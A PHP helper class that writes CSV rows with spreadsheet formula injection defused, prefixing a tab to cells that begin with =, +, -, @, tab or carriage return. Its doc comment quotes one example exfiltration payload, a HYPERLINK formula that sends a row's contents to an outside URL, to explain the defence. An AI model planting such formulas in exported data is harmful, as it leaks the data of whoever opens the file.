<?php

namespace App\Support;

/**
 * One CSV row, with spreadsheet formulas defused.
 *
 * ⚠️ Names and e-mails in exports were typed by customers. A cell beginning
 * `=`, `+`, `-` or `@` is a formula to Excel, Google Sheets and LibreOffice —
 * `=HYPERLINK("https://…"&A1,"x")` exfiltrates the row it sits in, and on some
 * Excel configurations the payload runs. Carriage returns and tabs lead the
 * same way: they are how a payload hides from somebody eyeballing the file.
 *
 * Prefixed with a tab rather than a quote: a leading `'` is swallowed by Excel
 * and shows up as part of the value in every other reader, while a tab keeps
 * the cell readable and stops it being parsed as a formula.
 */
final class CsvRow
{
    /** @param  resource  $out */
    public static function write($out, array $cells): void
    {
        fputcsv($out, array_map(static function ($cell) {
            if (! is_string($cell) || $cell === '') {
                return $cell;
            }

            return preg_match('/^[=+\-@\t\r]/', $cell) === 1 ? "\t".$cell : $cell;
        }, $cells));
    }
}
